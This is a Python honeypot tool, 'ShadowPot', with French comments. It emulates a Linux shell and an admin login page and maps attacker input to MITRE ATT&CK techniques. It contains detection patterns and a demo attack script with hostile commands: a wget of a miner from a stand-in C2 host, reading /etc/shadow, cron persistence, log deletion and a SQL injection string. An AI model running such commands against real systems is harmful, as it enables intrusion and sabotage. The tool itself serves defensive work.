#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=============================================================================
  SHADOWPOT — Honeypot Interactif & Moteur de Profilage MITRE ATT&CK
  Auteur  : Tohon Fourier (CalderaFourier-code)
  Version : 1.0.0
  Usage   : python shadowpot.py [options]
=============================================================================
"""

import argparse
import http.server
import json
import os
import re
import socket
import sys
import threading
import time
import urllib.parse
import urllib.request
from datetime import datetime

# Assure la compatibilité UTF-8 sous Windows PowerShell / CMD
if sys.platform.startswith("win"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass


# =============================================================================
# COULEURS & THEME TERMINAL
# =============================================================================
class Colors:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    GREEN = "\033[92m"
    LIGHT_GREEN = "\033[38;5;82m"
    CYAN = "\033[96m"
    BLUE = "\033[94m"
    YELLOW = "\033[93m"
    ORANGE = "\033[38;5;208m"
    RED = "\033[91m"
    MAGENTA = "\033[95m"
    GRAY = "\033[90m"


BANNER = f"""{Colors.ORANGE}
   _____ _    _          _____   ______          _____   ____ _______ 
  / ____| |  | |   /\\   |  __ \\ / __ \\ \\        / /  __ \\ / __ \\__   __|
 | (___ | |__| |  /  \\  | |  | | |  | \\ \\  /\\  / /| |__) | |  | | | |   
  \\___ \\|  __  | / /\\ \\ | |  | | |  | |\\ \\/  \\/ / |  ___/| |  | | | |   
  ____) | |  | |/ ____ \\| |__| | |__| | \\  /\\  /  | |    | |__| | | |   
 |_____/|_|  |_/_/    \\_\\_____/ \\______/   \\/  \\/   |_|     \\____/  |_|   
  {Colors.CYAN}[ Honeypot Interactif & Moteur de Profilage de Menaces MITRE ATT&CK ]{Colors.RESET}
  {Colors.GRAY}Auteur : Tohon Fourier | GitHub: CalderaFourier-code | v1.0.0{Colors.RESET}
"""

# =============================================================================
# MAPPING MITRE ATT&CK & DÉTECTION COMPORTEMENTALE
# =============================================================================
MITRE_RULES = [
    {
        "id": "T1003",
        "name": "OS Credential Dumping",
        "tactic": "Credential Access",
        "pattern": r"(cat\s+/etc/(passwd|shadow)|grep\s+.*shadow|unshadow|mimikatz|id_rsa)",
        "severity": "CRITICAL",
        "desc": "Tentative d'extraction de comptes ou de hashs de mots de passe système"
    },
    {
        "id": "T1105",
        "name": "Ingress Tool Transfer",
        "tactic": "Command and Control",
        "pattern": r"(wget\s+|curl\s+|tftp\s+|ftpget\s+|fetch\s+|scp\s+)",
        "severity": "HIGH",
        "desc": "Téléchargement d'un payload, script malveillant ou binaire distant"
    },
    {
        "id": "T1082",
        "name": "System Information Discovery",
        "tactic": "Discovery",
        "pattern": r"(uname\s+-[ar]|cat\s+/etc/.*release|lscpu|hostname|uptime)",
        "severity": "MEDIUM",
        "desc": "Reconnaissance de l'environnement, du noyau et de la distribution"
    },
    {
        "id": "T1033",
        "name": "System Owner/User Discovery",
        "tactic": "Discovery",
        "pattern": r"(whoami|id|w|who|last|groups)",
        "severity": "LOW",
        "desc": "Identification des privilèges de la session et des utilisateurs connectés"
    },
    {
        "id": "T1053",
        "name": "Scheduled Task / Job",
        "tactic": "Persistence",
        "pattern": r"(crontab\s+|/etc/cron|systemctl\s+enable)",
        "severity": "HIGH",
        "desc": "Tentative de persistance via tâche planifiée cron ou service système"
    },
    {
        "id": "T1222",
        "name": "File and Directory Permissions Modification",
        "tactic": "Defense Evasion",
        "pattern": r"(chmod\s+(\+x|777|755)|chown\s+)",
        "severity": "MEDIUM",
        "desc": "Rendre un payload exécutable ou modification de privilèges sur fichiers"
    },
    {
        "id": "T1059",
        "name": "Command and Scripting Interpreter",
        "tactic": "Execution",
        "pattern": r"(\./.*|bash\s+|sh\s+|python\s+|perl\s+|php\s+)",
        "severity": "MEDIUM",
        "desc": "Exécution de scripts automatisés ou d'interpréteurs de commande"
    },
    {
        "id": "T1485",
        "name": "Data Destruction",
        "tactic": "Impact",
        "pattern": r"(rm\s+-rf\s+|mkfs|dd\s+if=/dev/zero)",
        "severity": "CRITICAL",
        "desc": "Tentative de sabotage ou suppression massive de données"
    },
    {
        "id": "T1190",
        "name": "Exploit Public-Facing Application",
        "tactic": "Initial Access",
        "pattern": r"(SELECT\s+.*FROM|UNION\s+SELECT|'\s*OR\s*'1'='1|\.\./|\.env|wp-config)",
        "severity": "CRITICAL",
        "desc": "Injection SQL, Directory Traversal ou tentative d'accès aux fichiers sensibles"
    }
]

# Faux système de fichiers pour simuler un vrai serveur Linux
FAUX_FILESYSTEM = {
    "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\nadmin:x:1000:1000:admin,,,:/home/admin:/bin/bash\npostgres:x:1001:1001:PostgreSQL server,,,:/var/lib/postgresql:/bin/bash",
    "/etc/os-release": 'PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"\nNAME="Debian GNU/Linux"\nVERSION_ID="11"\nVERSION="11 (bullseye)"\nID=debian',
    "/etc/issue": "Debian GNU/Linux 11 \\n \\l\n"
}


# =============================================================================
# GESTIONNAIRE D'ÉVÉNEMENTS & SESSIONS
# =============================================================================
class ThreatLogger:
    def __init__(self, log_dir="logs"):
        self.log_dir = log_dir
        os.makedirs(self.log_dir, exist_ok=True)
        self.session_file = os.path.join(self.log_dir, "sessions.json")
        self.lock = threading.Lock()

    def log_event(self, session_data):
        with self.lock:
            sessions = []
            if os.path.exists(self.session_file):
                try:
                    with open(self.session_file, "r", encoding="utf-8") as f:
                        sessions = json.load(f)
                except Exception:
                    sessions = []
            sessions.append(session_data)
            with open(self.session_file, "w", encoding="utf-8") as f:
                json.dump(sessions, f, indent=2, ensure_ascii=False)


# =============================================================================
# HONEYPOT INTERACTIF SHELL (SSH/TELNET PSEUDO-SHELL)
# =============================================================================
class ShellHoneypot(threading.Thread):
    def __init__(self, host="0.0.0.0", port=2222, logger=None):
        super().__init__()
        self.host = host
        self.port = port
        self.logger = logger
        self.running = True
        self.sock = None

    def run(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind((self.host, self.port))
            self.sock.listen(10)
            print(f"{Colors.GREEN}[+] Honeypot Shell en écoute sur {self.host}:{self.port} (Simulateur Linux){Colors.RESET}")

            while self.running:
                try:
                    client_sock, addr = self.sock.accept()
                    client_thread = threading.Thread(target=self.handle_client, args=(client_sock, addr))
                    client_thread.daemon = True
                    client_thread.start()
                except Exception:
                    break
        except Exception as e:
            print(f"{Colors.RED}[!] Erreur Shell Honeypot : {e}{Colors.RESET}")

    def handle_client(self, sock, addr):
        client_ip = addr[0]
        client_port = addr[1]
        print(f"\n{Colors.RED}{Colors.BOLD}[🚨 INTRUSION DÉTECTÉE]{Colors.RESET} Connexion entrante depuis {Colors.CYAN}{client_ip}:{client_port}{Colors.RESET}")

        session_id = f"shell-{int(time.time())}-{client_port}"
        session_data = {
            "session_id": session_id,
            "type": "shell",
            "timestamp": datetime.now().isoformat(),
            "source_ip": client_ip,
            "source_port": client_port,
            "auth": {},
            "commands": [],
            "mitre_alerts": []
        }

        try:
            # Envoi bannière SSH / Login
            sock.sendall(b"SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1\r\n")
            time.sleep(0.5)
            sock.sendall(b"login: ")
            username = self.recv_line(sock).strip()
            sock.sendall(b"Password: ")
            password = self.recv_line(sock).strip()

            session_data["auth"] = {"username": username, "password": password}
            print(f"  {Colors.YELLOW}[AUTH]{Colors.RESET} Identifiants capturés : {Colors.BOLD}user='{username}', pass='{password}'{Colors.RESET}")

            # Message de bienvenue Linux trompeur
            welcome_msg = (
                "\r\nLinux debian-server 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 (2021-08-30) x86_64\r\n\r\n"
                "The programs included with the Debian GNU/Linux system are free software.\r\n"
                "Last login: Fri Oct 30 14:22:10 2026 from 10.0.0.15\r\n"
            )
            sock.sendall(welcome_msg.encode())

            # Boucle shell interactive
            cwd = "/root"
            while self.running:
                sock.sendall(f"root@debian-server:{cwd}# ".encode())
                cmd = self.recv_line(sock).strip()

                if not cmd:
                    continue

                if cmd.lower() in ["exit", "quit", "logout"]:
                    sock.sendall(b"logout\r\nConnection to debian-server closed.\r\n")
                    break

                # Analyse MITRE ATT&CK
                matched_mitre = self.analyze_command(cmd)
                timestamp = datetime.now().strftime("%H:%M:%S")

                cmd_entry = {
                    "time": timestamp,
                    "command": cmd,
                    "mitre": [m["id"] for m in matched_mitre]
                }
                session_data["commands"].append(cmd_entry)

                print(f"  {Colors.GRAY}[{timestamp}]{Colors.RESET} {Colors.CYAN}{client_ip}{Colors.RESET} $ {Colors.BOLD}{cmd}{Colors.RESET}")

                for m in matched_mitre:
                    session_data["mitre_alerts"].append(m)
                    sev_col = Colors.RED if m["severity"] == "CRITICAL" else Colors.ORANGE if m["severity"] == "HIGH" else Colors.YELLOW
                    print(f"    {sev_col}{Colors.BOLD}[⚡ MITRE {m['id']} - {m['name']}]{Colors.RESET} {m['desc']}")

                # Réponse émulée
                response = self.execute_fake_command(cmd, cwd)
                if response:
                    sock.sendall(response.encode() + b"\r\n")

        except Exception:
            pass
        finally:
            try:
                sock.close()
            except Exception:
                pass
            print(f"{Colors.GRAY}[*] Session terminée pour {client_ip} ({len(session_data['commands'])} commandes enregistrées){Colors.RESET}")
            if self.logger:
                self.logger.log_event(session_data)

    def recv_line(self, sock):
        line = b""
        while True:
            char = sock.recv(1)
            if not char or char == b"\n":
                break
            if char != b"\r":
                line += char
        return line.decode("utf-8", errors="ignore")

    def analyze_command(self, cmd):
        alerts = []
        for rule in MITRE_RULES:
            if re.search(rule["pattern"], cmd, re.IGNORECASE):
                alerts.append(rule)
        return alerts

    def execute_fake_command(self, cmd, cwd):
        cmd = cmd.strip()
        parts = cmd.split()
        base = parts[0] if parts else ""

        if base == "whoami":
            return "root"
        elif base == "id":
            return "uid=0(root) gid=0(root) groups=0(root)"
        elif base == "uname":
            if "-a" in parts or "-r" in parts:
                return "Linux debian-server 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 (2021-08-30) x86_64 GNU/Linux"
            return "Linux"
        elif base == "hostname":
            return "debian-server"
        elif base == "uptime":
            return " 03:45:12 up 42 days, 11:15,  1 user,  load average: 0.08, 0.03, 0.01"
        elif base == "ls":
            return "bin   dev  home        lib64       mnt  proc  run   srv  tmp  var\nboot  etc  lib   lost+found  opt  root  sbin  sys  usr"
        elif base == "cat":
            if len(parts) > 1:
                target_file = parts[1]
                if target_file in FAUX_FILESYSTEM:
                    return FAUX_FILESYSTEM[target_file]
                elif "shadow" in target_file:
                    return "root:$6$rounds=4096$salt$fakehashhashhash:18942:0:99999:7:::\nadmin:$6$rounds=4096$salt$fakeadminhash:18942:0:99999:7:::"
                return f"cat: {target_file}: No such file or directory"
            return ""
        elif base in ["wget", "curl"]:
            url = parts[1] if len(parts) > 1 else "target"
            return f"--2026-10-31 03:46:00--  {url}\nResolving host... 192.168.1.1\nConnecting... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 14208 (14K) [application/x-sh]\nSaving to: 'malware.sh'\n\n100%[===================>] 14,208      --.-K/s   in 0.002s\n\n'malware.sh' saved [14208/14208]"
        elif base == "chmod":
            return ""
        elif base == "ps":
            return "  PID TTY          TIME CMD\n    1 ?        00:00:02 systemd\n  542 ?        00:00:00 sshd\n 1204 pts/0    00:00:00 bash\n 1450 pts/0    00:00:00 ps"
        elif base in ["ifconfig", "ip"]:
            return "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 192.168.1.150  netmask 255.255.255.0  broadcast 192.168.1.255"
        else:
            return f"bash: {base}: command not found"


# =============================================================================
# HONEYPOT WEB (HTTP ADMIN & VULNERABILITY TRAP)
# =============================================================================
class WebHoneypotHandler(http.server.BaseHTTPRequestHandler):
    logger = None

    def log_message(self, format, *args):
        pass  # Désactive les logs standard de http.server pour garder la console propre

    def do_GET(self):
        client_ip = self.client_address[0]
        path = self.path

        # Détection d'attaques Web
        matched_mitre = []
        for rule in MITRE_RULES:
            if re.search(rule["pattern"], path, re.IGNORECASE):
                matched_mitre.append(rule)

        print(f"\n{Colors.RED}{Colors.BOLD}[🌐 WEB INTRUSION]{Colors.RESET} Requête GET depuis {Colors.CYAN}{client_ip}{Colors.RESET} -> {Colors.BOLD}{path}{Colors.RESET}")
        for m in matched_mitre:
            sev_col = Colors.RED if m["severity"] == "CRITICAL" else Colors.ORANGE
            print(f"  {sev_col}[⚡ MITRE {m['id']} - {m['name']}]{Colors.RESET} {m['desc']}")

        session_data = {
            "session_id": f"web-{int(time.time())}-{self.client_address[1]}",
            "type": "web_probe",
            "timestamp": datetime.now().isoformat(),
            "source_ip": client_ip,
            "method": "GET",
            "path": path,
            "headers": dict(self.headers),
            "mitre_alerts": matched_mitre
        }

        if WebHoneypotHandler.logger:
            WebHoneypotHandler.logger.log_event(session_data)

        # Fausse page d'administration vulnérable
        html_page = """<!DOCTYPE html>
<html>
<head><title>Portail d'Administration - Connexion Sécurisée</title>
<style>
body { font-family: sans-serif; background: #1a1e24; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
.box { background: #22272e; padding: 30px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); width: 320px; }
input { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #444; border-radius: 4px; box-sizing: border-box; background: #0d1117; color: #fff; }
button { width: 100%; padding: 10px; background: #2ea043; color: #fff; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
</style>
</head>
<body>
<div class="box">
    <h2>Portail Intranet</h2>
    <p style="font-size: 12px; color: #888;">Accès réservé aux administrateurs autorisés.</p>
    <form method="POST" action="/login">
        <input type="text" name="username" placeholder="Identifiant" required><br>
        <input type="password" name="password" placeholder="Mot de passe" required><br>
        <button type="submit">Se connecter</button>
    </form>
</div>
</body>
</html>"""
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Server", "Apache/2.4.49 (Debian)")
        self.end_headers()
        self.wfile.write(html_page.encode("utf-8"))

    def do_POST(self):
        client_ip = self.client_address[0]
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length).decode('utf-8', errors='ignore')

        print(f"\n{Colors.RED}{Colors.BOLD}[🚨 TENTATIVE DE BRUTE-FORCE WEB]{Colors.RESET} POST depuis {Colors.CYAN}{client_ip}{Colors.RESET}")
        print(f"  {Colors.YELLOW}[POST DATA]{Colors.RESET} {body}")

        matched_mitre = []
        for rule in MITRE_RULES:
            if re.search(rule["pattern"], body, re.IGNORECASE):
                matched_mitre.append(rule)

        for m in matched_mitre:
            sev_col = Colors.RED if m["severity"] == "CRITICAL" else Colors.ORANGE
            print(f"  {sev_col}[⚡ MITRE {m['id']} - {m['name']}]{Colors.RESET} {m['desc']}")

        session_data = {
            "session_id": f"web-post-{int(time.time())}",
            "type": "web_auth_attempt",
            "timestamp": datetime.now().isoformat(),
            "source_ip": client_ip,
            "method": "POST",
            "path": self.path,
            "body": body,
            "mitre_alerts": matched_mitre
        }

        if WebHoneypotHandler.logger:
            WebHoneypotHandler.logger.log_event(session_data)

        # Réponse échec de connexion réaliste
        self.send_response(401)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(b"<html><body><h3>401 - Identifiants invalides. Tentative enregistree.</h3></body></html>")


class WebHoneypot(threading.Thread):
    def __init__(self, host="0.0.0.0", port=8080, logger=None):
        super().__init__()
        self.host = host
        self.port = port
        self.logger = logger
        self.server = None

    def run(self):
        WebHoneypotHandler.logger = self.logger
        try:
            self.server = http.server.HTTPServer((self.host, self.port), WebHoneypotHandler)
            print(f"{Colors.GREEN}[+] Honeypot Web en écoute sur http://{self.host}:{self.port} (Portail Faux Admin){Colors.RESET}")
            self.server.serve_forever()
        except Exception as e:
            print(f"{Colors.RED}[!] Erreur Web Honeypot : {e}{Colors.RESET}")


# =============================================================================
# GÉNÉRATEUR DE RAPPORT D'INCIDENT (HTML & MARKDOWN)
# =============================================================================
def generate_incident_report(log_dir="logs", report_path="logs/rapport_incidents.html"):
    session_file = os.path.join(log_dir, "sessions.json")
    if not os.path.exists(session_file):
        print(f"{Colors.YELLOW}[i] Aucun fichier de session trouvé pour générer le rapport.{Colors.RESET}")
        return

    try:
        with open(session_file, "r", encoding="utf-8") as f:
            sessions = json.load(f)
    except Exception:
        sessions = []

    rows = ""
    total_attacks = len(sessions)
    unique_ips = len(set(s.get("source_ip") for s in sessions))
    mitre_count = sum(len(s.get("mitre_alerts", [])) for s in sessions)

    for s in sessions:
        sid = s.get("session_id", "N/A")
        sip = s.get("source_ip", "Inconnu")
        stype = s.get("type", "Inconnu")
        stime = s.get("timestamp", "")[:19]

        alerts_html = ""
        for a in s.get("mitre_alerts", []):
            sev_class = "crit" if a["severity"] == "CRITICAL" else "high" if a["severity"] == "HIGH" else "med"
            alerts_html += f'<span class="badge {sev_class}">[{a["id"]}] {a["name"]}</span> '

        cmds_html = ""
        for c in s.get("commands", []):
            cmds_html += f"<code>$ {c.get('command')}</code><br>"
        if s.get("body"):
            cmds_html += f"<code>PAYLOAD: {s.get('body')}</code>"

        rows += f"""
        <tr>
            <td><strong>{sip}</strong><br><small>{stime}</small></td>
            <td><span class="type-tag">{stype}</span></td>
            <td>{cmds_html if cmds_html else '<em style="color:#666">Connexion sonde</em>'}</td>
            <td>{alerts_html if alerts_html else '<em style="color:#666">Aucune technique identifiée</em>'}</td>
        </tr>"""

    html = f"""<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>ShadowPot — Rapport d'Analyse des Menaces & Intrusions</title>
    <style>
        body {{ background: #0d1117; color: #c9d1d9; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 30px; margin: 0; }}
        h1 {{ color: #f0883e; font-family: monospace; border-bottom: 2px solid #30363d; padding-bottom: 15px; }}
        .stats-grid {{ display: flex; gap: 20px; margin: 25px 0; }}
        .stat-card {{ background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 20px; flex: 1; text-align: center; }}
        .stat-num {{ font-size: 32px; font-weight: bold; color: #58a6ff; font-family: monospace; }}
        .stat-label {{ color: #8b949e; font-size: 12px; text-transform: uppercase; margin-top: 5px; }}
        table {{ width: 100%; border-collapse: collapse; background: #161b22; border-radius: 6px; overflow: hidden; border: 1px solid #30363d; }}
        th {{ background: #21262d; color: #f0883e; text-align: left; padding: 14px; font-size: 13px; font-family: monospace; }}
        td {{ padding: 14px; border-bottom: 1px solid #30363d; font-size: 13px; vertical-align: top; }}
        code {{ background: #0d1117; padding: 3px 6px; border-radius: 4px; color: #7ee787; font-family: monospace; font-size: 12px; }}
        .badge {{ padding: 4px 8px; border-radius: 4px; font-size: 11px; font-family: monospace; font-weight: bold; display: inline-block; margin: 2px; }}
        .badge.crit {{ background: rgba(248, 81, 73, 0.2); color: #f85149; border: 1px solid #f85149; }}
        .badge.high {{ background: rgba(210, 153, 34, 0.2); color: #d29922; border: 1px solid #d29922; }}
        .badge.med  {{ background: rgba(88, 166, 255, 0.2); color: #58a6ff; border: 1px solid #58a6ff; }}
        .type-tag {{ background: #30363d; padding: 3px 8px; border-radius: 3px; font-size: 11px; color: #c9d1d9; }}
        .footer {{ margin-top: 40px; text-align: center; font-size: 12px; color: #8b949e; }}
    </style>
</head>
<body>
    <h1>🍯 SHADOWPOT — RAPPORT DE PROFILAGE DE MENACES</h1>
    <p>Généré le <strong>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</strong> par le système ShadowPot (Tohon Fourier).</p>

    <div class="stats-grid">
        <div class="stat-card">
            <div class="stat-num">{total_attacks}</div>
            <div class="stat-label">Intrusions Traitées</div>
        </div>
        <div class="stat-card">
            <div class="stat-num">{unique_ips}</div>
            <div class="stat-label">Adresses IP Uniques</div>
        </div>
        <div class="stat-card">
            <div class="stat-num" style="color: #f85149;">{mitre_count}</div>
            <div class="stat-label">TTPs MITRE Détectés</div>
        </div>
    </div>

    <table>
        <thead>
            <tr>
                <th style="width: 200px;">SOURCE & HEURE</th>
                <th style="width: 120px;">VECTEUR</th>
                <th>ACTIVITÉ & COMMANDES CAPTURÉES</th>
                <th style="width: 320px;">CLASSIFICATION MITRE ATT&CK</th>
            </tr>
        </thead>
        <tbody>
            {rows}
        </tbody>
    </table>

    <div class="footer">
        ShadowPot v1.0.0 — Développé par Tohon Fourier (CalderaFourier-code). Analyse défensive et renseignement sur la menace.
    </div>
</body>
</html>"""

    with open(report_path, "w", encoding="utf-8") as f:
        f.write(html)
    print(f"\n{Colors.GREEN}[✓] Rapport d'incident généré avec succès :{Colors.RESET} {report_path}")


# =============================================================================
# MODE DÉMONSTRATION AUTOMATISÉ (SIMULATION SANS DÉPENDANCE RÉSEAU)
# =============================================================================
def run_simulation(logger):
    """Simule un attaquant réaliste exécutant des scénarios de cyberattaque."""
    print(f"\n{Colors.MAGENTA}{Colors.BOLD}=== LANCEMENT DE LA SIMULATION D'ATTAQUE (ROUGE / OFFENSIVE) ==={Colors.RESET}")
    print(f"{Colors.GRAY}Scénario 1 : Un attaquant externe compromet le shell Linux et exécute des TTPs...{Colors.RESET}\n")

    attacker_ip = "185.220.101.5"  # IP d'un noeud Tor ou C2 simulé
    attacker_port = 48210

    print(f"{Colors.RED}{Colors.BOLD}[🚨 INTRUSION DÉTECTÉE]{Colors.RESET} Connexion entrante depuis {Colors.CYAN}{attacker_ip}:{attacker_port}{Colors.RESET}")
    time.sleep(0.3)
    print(f"  {Colors.YELLOW}[AUTH]{Colors.RESET} Identifiants capturés : {Colors.BOLD}user='root', pass='toor123'{Colors.RESET}")

    session_id = f"shell-{int(time.time())}-{attacker_port}"
    session_data = {
        "session_id": session_id,
        "type": "shell",
        "timestamp": datetime.now().isoformat(),
        "source_ip": attacker_ip,
        "source_port": attacker_port,
        "auth": {"username": "root", "password": "toor123"},
        "commands": [],
        "mitre_alerts": []
    }

    test_commands = [
        ("whoami", "Découverte de l'identité système"),
        ("uname -a", "Reconnaissance du noyau et de la distribution"),
        ("cat /etc/passwd", "Vol de comptes et hachages d'utilisateurs"),
        ("cat /etc/shadow", "Extraction de hashs critiques"),
        ("wget http://c2-malware.darknet.ru/miner.sh", "Téléchargement d'un mineur furtif"),
        ("chmod +x miner.sh", "Attribution des droits d'exécution"),
        ("crontab -e", "Tentative d'implantation de persistance"),
        ("rm -rf /var/log/audit.log", "Évasion de défense et destruction de preuves")
    ]

    shell_helper = ShellHoneypot(logger=logger)

    for cmd, purpose in test_commands:
        time.sleep(0.25)
        matched = shell_helper.analyze_command(cmd)
        ts = datetime.now().strftime("%H:%M:%S")

        session_data["commands"].append({
            "time": ts,
            "command": cmd,
            "mitre": [m["id"] for m in matched]
        })

        print(f"  {Colors.GRAY}[{ts}]{Colors.RESET} {Colors.CYAN}{attacker_ip}{Colors.RESET} $ {Colors.BOLD}{cmd}{Colors.RESET}")

        for m in matched:
            session_data["mitre_alerts"].append(m)
            sev_col = Colors.RED if m["severity"] == "CRITICAL" else Colors.ORANGE if m["severity"] == "HIGH" else Colors.YELLOW
            print(f"    {sev_col}{Colors.BOLD}[⚡ MITRE {m['id']} - {m['name']}]{Colors.RESET} ({m['tactic']}) -> {m['desc']}")

        resp = shell_helper.execute_fake_command(cmd, "/root")
        if resp:
            first_line = resp.split("\n")[0]
            print(f"    {Colors.GRAY}↳ Réponse émulée : {first_line[:70]}...{Colors.RESET}")

    logger.log_event(session_data)
    print(f"{Colors.GRAY}[*] Session shell clôturée pour {attacker_ip} (8 commandes tracées).{Colors.RESET}")

    # Scénario 2 : Sonde Web & Injection SQL
    time.sleep(0.5)
    print(f"\n{Colors.GRAY}Scénario 2 : L'attaquant effectue des sondes de fichiers sensibles et une injection SQL...{Colors.RESET}\n")

    web_attacker_ip = "45.154.255.89"
    web_attacks = [
        ("GET", "/.env", ""),
        ("GET", "/wp-login.php", ""),
        ("POST", "/login", "username=admin' OR '1'='1&password=password")
    ]

    for method, path, body in web_attacks:
        time.sleep(0.3)
        target_check = path if method == "GET" else body
        matched_web = []
        for rule in MITRE_RULES:
            if re.search(rule["pattern"], target_check, re.IGNORECASE):
                matched_web.append(rule)

        print(f"{Colors.RED}{Colors.BOLD}[🌐 WEB INTRUSION]{Colors.RESET} Requête {method} depuis {Colors.CYAN}{web_attacker_ip}{Colors.RESET} -> {Colors.BOLD}{path}{Colors.RESET}")
        if body:
            print(f"  {Colors.YELLOW}[POST DATA]{Colors.RESET} {body}")

        for m in matched_web:
            sev_col = Colors.RED if m["severity"] == "CRITICAL" else Colors.ORANGE
            print(f"  {sev_col}{Colors.BOLD}[⚡ MITRE {m['id']} - {m['name']}]{Colors.RESET} {m['desc']}")

        w_session = {
            "session_id": f"web-{int(time.time())}",
            "type": "web_probe",
            "timestamp": datetime.now().isoformat(),
            "source_ip": web_attacker_ip,
            "method": method,
            "path": path,
            "body": body,
            "mitre_alerts": matched_web
        }
        logger.log_event(w_session)

    time.sleep(0.5)
    print(f"\n{Colors.GREEN}{Colors.BOLD}=== SIMULATION TERMINÉE — GÉNÉRATION DU RAPPORT DE MENACES ==={Colors.RESET}")
    generate_incident_report(log_dir="logs", report_path="logs/rapport_incidents.html")
    print(f"{Colors.LIGHT_GREEN}[✓] Démonstration ShadowPot achevée avec succès !{Colors.RESET}\n")


# =============================================================================
# POINT D'ENTRÉE CLI
# =============================================================================
def main():
    print(BANNER)

    parser = argparse.ArgumentParser(
        description="ShadowPot : Honeypot interactif multi-services avec classification MITRE ATT&CK",
        epilog="Exemple : python shadowpot.py --demo"
    )
    parser.add_argument("--host", default="0.0.0.0", help="Adresse IP d'écoute (Défaut: 0.0.0.0)")
    parser.add_argument("--shell-port", type=int, default=2222, help="Port du faux shell Linux (Défaut: 2222)")
    parser.add_argument("--web-port", type=int, default=8080, help="Port du faux portail Web (Défaut: 8080)")
    parser.add_argument("--demo", action="store_true", help="Lance une simulation d'attaque complète et génère le rapport")
    parser.add_argument("--report", action="store_true", help="Génère uniquement le rapport HTML à partir des sessions existantes")

    args = parser.parse_args()

    logger = ThreatLogger(log_dir="logs")

    if args.report:
        generate_incident_report(log_dir="logs", report_path="logs/rapport_incidents.html")
        return

    if args.demo:
        run_simulation(logger)
        return

    # Lancement des serveurs Honeypot en mode écoute réelle
    shell_srv = ShellHoneypot(host=args.host, port=args.shell_port, logger=logger)
    shell_srv.daemon = True
    shell_srv.start()

    web_srv = WebHoneypot(host=args.host, port=args.web_port, logger=logger)
    web_srv.daemon = True
    web_srv.start()

    time.sleep(0.5)
    print(f"{Colors.CYAN}[*] Les pièges sont armés. En attente d'intrusions...{Colors.RESET}")
    print(f"{Colors.GRAY}    -> Pour tester le shell : nc localhost {args.shell_port} ou telnet localhost {args.shell_port}")
    print(f"    -> Pour tester le web   : http://localhost:{args.web_port}{Colors.RESET}")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[*] Arrêt de ShadowPot demandée...{Colors.RESET}")
        generate_incident_report(log_dir="logs", report_path="logs/rapport_incidents.html")
        print(f"{Colors.GREEN}[✓] Rapport mis à jour. Au revoir.{Colors.RESET}")


if __name__ == "__main__":
    main()
